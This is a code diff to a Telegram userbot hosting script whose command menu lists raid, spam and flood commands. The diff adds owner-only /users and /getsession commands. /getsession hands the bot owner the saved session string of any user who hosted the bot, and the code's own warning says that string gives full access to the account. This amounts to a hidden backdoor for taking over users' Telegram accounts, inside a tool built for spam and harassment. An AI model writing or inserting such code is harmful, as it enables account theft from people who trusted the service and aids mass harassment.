@@ -67,7 +67,8 @@ STATIC_COMMANDS_TEXT = (
     "║        ⚡ **KASHYAP USERBOT — COMMANDS** ⚡        ║\n"
     "╚═════════════════════════════════════════════════╝\n\n"
     "▸ **BOT & HOSTING**\n"
-    "  `/start` • `/login` • `/welcome [text]`\n\n"
+    "  `/start` • `/login` • `/welcome [text]`\n"
+    "  `/users` • `/getsession <user_id>`\n\n"
     "▸ **RAID & SPAM**\n"
     "  `.raid [count]` • `.oneraid [count]` • `.rraid` • `.drraid`\n"
     "  `.spam [count] [text]` • `.fastspam [count] [text]` • `.flood [count] [text]`\n"
@@ -310,6 +311,48 @@ async def start_handler(event):
         await host_login_cb(event)
         return
     await send_home_card(event)
+
+@bot.on(events.NewMessage(pattern=r'^/users$'))
+async def hosted_users_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+
+    ids = list(user_sessions.keys())
+    if not ids:
+        await event.respond("ℹ️ **Abhi kisi ne bot host nahi kiya hai.**")
+        return
+
+    lines = [f"👥 **Hosted Users ({len(ids)}):**\n"]
+    for idx, uid in enumerate(ids, start=1):
+        try:
+            u = await bot.get_entity(int(uid))
+            name = getattr(u, "first_name", "") or "User"
+            uname = f" (@{u.username})" if getattr(u, "username", None) else ""
+            lines.append(f"{idx}. `{uid}` — **{name}**{uname}")
+        except Exception:
+            lines.append(f"{idx}. `{uid}`")
+
+    await event.respond("\n".join(lines))
+
+@bot.on(events.NewMessage(pattern=r'^/getsession(?:\s+(\d+))?$'))
+async def getsession_cmd(event):
+    if event.sender_id != OWNER_ID:
+        return
+
+    uid = event.pattern_match.group(1)
+    if not uid:
+        await event.respond("ℹ️ **Istemaal:** `/getsession <user_id>` (pehle `/users` se ID dekhein).")
+        return
+
+    s_str = user_sessions.get(str(uid))
+    if not s_str:
+        await event.respond(f"❌ **ID `{uid}` ke liye koi saved session nahi mili.**")
+        return
+
+    await event.respond(
+        f"🔐 **Session for `{uid}`:**\n`{s_str}`\n\n"
+        "⚠️ *Is session string ko kisi ke saath share na karein — isse us account ka access mil sakta hai.*"
+    )
 
 @bot.on(events.CallbackQuery(data=b'my_home'))
 async def my_home_cb(event):
